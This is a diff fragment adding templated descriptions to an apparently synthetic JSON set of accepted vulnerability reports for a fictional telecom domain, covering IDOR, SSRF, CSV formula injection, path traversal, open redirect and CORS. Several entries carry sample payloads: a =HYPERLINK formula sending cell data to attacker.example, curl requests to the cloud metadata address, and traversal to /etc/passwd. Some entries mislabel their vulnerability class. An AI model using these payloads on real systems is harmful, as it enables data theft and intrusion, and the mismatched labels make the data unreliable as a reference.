+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.bergtal-telecom.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2384,7 +2402,8 @@
           "offset": "1d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2508,7 +2527,8 @@
           "offset": "1d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2664,7 +2684,8 @@
           "offset": "7d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.bergtal-telecom.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2771,7 +2792,8 @@
           "offset": "10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2935,7 +2957,8 @@
           "offset": "6d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.bergtal-telecom.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3049,7 +3072,8 @@
           "offset": "6d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.bergtal-telecom.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3159,7 +3183,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3315,7 +3340,8 @@
           "offset": "3d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.bergtal-telecom.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3443,7 +3469,8 @@
           "offset": "3d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3594,7 +3621,8 @@
           "offset": "2d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3718,7 +3746,8 @@
           "offset": "2d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.bergtal-telecom.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3868,7 +3897,8 @@
           "offset": "6d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4036,7 +4066,8 @@
           "offset": "7d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4119,7 +4150,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4210,7 +4242,8 @@
           "offset": "12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4364,7 +4397,8 @@
           "offset": "3d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4511,7 +4545,8 @@
           "offset": "1d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4663,7 +4698,8 @@
           "offset": "8d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.bergtal-telecom.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4757,7 +4793,8 @@
           "offset": "4d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4928,7 +4965,8 @@
           "offset": "3d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5051,7 +5089,8 @@
           "offset": "3d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.bergtal-telecom.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5191,7 +5230,8 @@
           "offset": "5d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5311,7 +5351,8 @@
           "offset": "4d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5431,7 +5472,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.bergtal-telecom.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5599,7 +5641,8 @@
           "offset": "5d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5697,7 +5740,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.bergtal-telecom.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5801,7 +5845,8 @@
           "offset": "1d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5973,7 +6018,8 @@
           "offset": "4d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.bergtal-telecom.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6121,7 +6167,8 @@
           "offset": "8d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6252,7 +6299,8 @@
           "offset": "5d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6376,7 +6424,8 @@
           "offset": "6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
